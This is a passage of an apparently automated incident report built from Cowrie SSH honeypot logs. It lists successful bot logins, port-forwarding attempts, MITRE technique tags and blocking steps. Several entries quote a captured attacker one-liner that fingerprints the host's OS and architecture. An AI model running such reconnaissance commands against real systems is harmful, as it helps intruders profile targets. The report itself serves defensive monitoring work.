**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:02:54` | `cowrie.session.connect` |
| `2026-08-12 05:02:54` | `cowrie.client.version` |
| `2026-08-12 05:02:54` | `cowrie.client.kex` |
| `2026-08-12 05:02:55` | `cowrie.login.success` |
| `2026-08-12 05:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc7b0a0ebc37

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-12 05:03 |
| **Last Seen** | 2026-08-12 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:03:01` | `cowrie.session.connect` |
| `2026-08-12 05:03:01` | `cowrie.client.version` |
| `2026-08-12 05:03:01` | `cowrie.client.kex` |
| `2026-08-12 05:03:02` | `cowrie.login.success` |
| `2026-08-12 05:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-067ffbce68c2

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-12 05:03 |
| **Last Seen** | 2026-08-12 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:03:02` | `cowrie.session.connect` |
| `2026-08-12 05:03:02` | `cowrie.client.version` |
| `2026-08-12 05:03:03` | `cowrie.client.kex` |
| `2026-08-12 05:03:04` | `cowrie.login.success` |
| `2026-08-12 05:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0defd1da07d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:04 |
| **Last Seen** | 2026-08-12 05:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:04:41` | `cowrie.session.connect` |
| `2026-08-12 05:04:41` | `cowrie.client.version` |
| `2026-08-12 05:04:41` | `cowrie.client.kex` |
| `2026-08-12 05:04:42` | `cowrie.login.success` |
| `2026-08-12 05:04:43` | `cowrie.session.params` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.success` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:43` | `cowrie.command.input` |
| `2026-08-12 05:04:44` | `cowrie.log.closed` |
| `2026-08-12 05:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dbf4c07b7f7

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-12 05:05 |
| **Last Seen** | 2026-08-12 05:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:05:20` | `cowrie.session.connect` |
| `2026-08-12 05:05:21` | `cowrie.client.version` |
| `2026-08-12 05:05:21` | `cowrie.client.kex` |
| `2026-08-12 05:05:23` | `cowrie.login.success` |
| `2026-08-12 05:05:24` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ca8c82b967d

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-12 05:05 |
| **Last Seen** | 2026-08-12 05:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:05:29` | `cowrie.session.connect` |
| `2026-08-12 05:05:30` | `cowrie.client.version` |
| `2026-08-12 05:05:30` | `cowrie.client.kex` |
| `2026-08-12 05:05:31` | `cowrie.login.success` |
| `2026-08-12 05:05:31` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac4130b90ac

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:07 |
| **Last Seen** | 2026-08-12 05:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:07:05` | `cowrie.session.connect` |
| `2026-08-12 05:07:05` | `cowrie.client.version` |
| `2026-08-12 05:07:05` | `cowrie.client.kex` |
| `2026-08-12 05:07:06` | `cowrie.login.success` |
| `2026-08-12 05:07:07` | `cowrie.session.params` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.success` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.command.input` |
| `2026-08-12 05:07:07` | `cowrie.log.closed` |
| `2026-08-12 05:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2955001bd2ab

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:09 |
| **Last Seen** | 2026-08-12 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:09:40` | `cowrie.session.connect` |
| `2026-08-12 05:09:40` | `cowrie.client.version` |
| `2026-08-12 05:09:40` | `cowrie.client.kex` |
| `2026-08-12 05:09:41` | `cowrie.login.success` |
| `2026-08-12 05:09:42` | `cowrie.session.params` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.success` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.command.input` |
| `2026-08-12 05:09:42` | `cowrie.log.closed` |
| `2026-08-12 05:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a528e047b7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:12 |
| **Last Seen** | 2026-08-12 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:12:19` | `cowrie.session.connect` |
| `2026-08-12 05:12:19` | `cowrie.client.version` |
| `2026-08-12 05:12:19` | `cowrie.client.kex` |
| `2026-08-12 05:12:20` | `cowrie.login.success` |
| `2026-08-12 05:12:20` | `cowrie.session.params` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.success` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.command.input` |
| `2026-08-12 05:12:20` | `cowrie.log.closed` |
| `2026-08-12 05:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-971762ac548d

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-08-12 05:14 |
| **Last Seen** | 2026-08-12 05:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:14:41` | `cowrie.session.connect` |
| `2026-08-12 05:14:41` | `cowrie.client.version` |
| `2026-08-12 05:14:41` | `cowrie.client.kex` |
| `2026-08-12 05:14:43` | `cowrie.login.success` |
| `2026-08-12 05:14:44` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eeb944296a2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:14 |
| **Last Seen** | 2026-08-12 05:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:14:46` | `cowrie.session.connect` |
| `2026-08-12 05:14:46` | `cowrie.client.version` |
| `2026-08-12 05:14:46` | `cowrie.client.kex` |
| `2026-08-12 05:14:47` | `cowrie.login.success` |
| `2026-08-12 05:14:48` | `cowrie.session.params` |
| `2026-08-12 05:14:48` | `cowrie.command.input` |
| `2026-08-12 05:14:48` | `cowrie.command.input` |
| `2026-08-12 05:14:48` | `cowrie.command.input` |
| `2026-08-12 05:14:48` | `cowrie.command.input` |
| `2026-08-12 05:14:48` | `cowrie.command.input` |
| `2026-08-12 05:14:48` | `cowrie.command.success` |
| `2026-08-12 05:14:48` | `cowrie.command.input` |
| `2026-08-12 05:14:49` | `cowrie.command.input` |
| `2026-08-12 05:14:49` | `cowrie.command.input` |
| `2026-08-12 05:14:49` | `cowrie.command.input` |
| `2026-08-12 05:14:49` | `cowrie.log.closed` |
| `2026-08-12 05:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0d8c73a98a

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-08-12 05:14 |
| **Last Seen** | 2026-08-12 05:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:14:49` | `cowrie.session.connect` |
| `2026-08-12 05:14:50` | `cowrie.client.version` |
| `2026-08-12 05:14:50` | `cowrie.client.kex` |
| `2026-08-12 05:14:52` | `cowrie.login.success` |
| `2026-08-12 05:14:52` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd77dac52bd9

| Field | Detail |
|---|---|
| **Source IP** | `185.226.197[.]40` |
| **First Seen** | 2026-08-12 05:15 |
| **Last Seen** | 2026-08-12 05:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:15:53` | `cowrie.session.connect` |
| `2026-08-12 05:15:53` | `cowrie.login.success` |
| `2026-08-12 05:15:54` | `cowrie.session.params` |
| `2026-08-12 05:15:54` | `cowrie.command.input` |
| `2026-08-12 05:15:54` | `cowrie.command.input` |
| `2026-08-12 05:15:54` | `cowrie.command.failed` |
| `2026-08-12 05:15:54` | `cowrie.command.input` |
| `2026-08-12 05:15:54` | `cowrie.command.failed` |
| `2026-08-12 05:15:54` | `cowrie.command.input` |
| `2026-08-12 05:15:54` | `cowrie.log.closed` |
| `2026-08-12 05:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.226.197[.]40` to AbuseIPDB if not already reported
- [ ] Block `185.226.197[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c938cc35170

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:17 |
| **Last Seen** | 2026-08-12 05:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:17:11` | `cowrie.session.connect` |
| `2026-08-12 05:17:11` | `cowrie.client.version` |
| `2026-08-12 05:17:11` | `cowrie.client.kex` |
| `2026-08-12 05:17:13` | `cowrie.login.success` |
| `2026-08-12 05:17:14` | `cowrie.session.params` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.success` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.command.input` |
| `2026-08-12 05:17:14` | `cowrie.log.closed` |
| `2026-08-12 05:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f38a10492e3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:19 |
| **Last Seen** | 2026-08-12 05:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:19:32` | `cowrie.session.connect` |
| `2026-08-12 05:19:32` | `cowrie.client.version` |
| `2026-08-12 05:19:32` | `cowrie.client.kex` |
| `2026-08-12 05:19:33` | `cowrie.login.success` |
| `2026-08-12 05:19:35` | `cowrie.session.params` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.success` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.command.input` |
| `2026-08-12 05:19:35` | `cowrie.log.closed` |
| `2026-08-12 05:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c85a5ae473d2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:21 |
| **Last Seen** | 2026-08-12 05:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:21:51` | `cowrie.session.connect` |
| `2026-08-12 05:21:51` | `cowrie.client.version` |
| `2026-08-12 05:21:51` | `cowrie.client.kex` |
| `2026-08-12 05:21:53` | `cowrie.login.success` |
| `2026-08-12 05:21:54` | `cowrie.session.params` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.success` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.command.input` |
| `2026-08-12 05:21:54` | `cowrie.log.closed` |
| `2026-08-12 05:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99fd012528f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:24 |
| **Last Seen** | 2026-08-12 05:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:24:13` | `cowrie.session.connect` |
| `2026-08-12 05:24:13` | `cowrie.client.version` |
| `2026-08-12 05:24:13` | `cowrie.client.kex` |
| `2026-08-12 05:24:14` | `cowrie.login.success` |
| `2026-08-12 05:24:15` | `cowrie.session.params` |
| `2026-08-12 05:24:15` | `cowrie.command.input` |
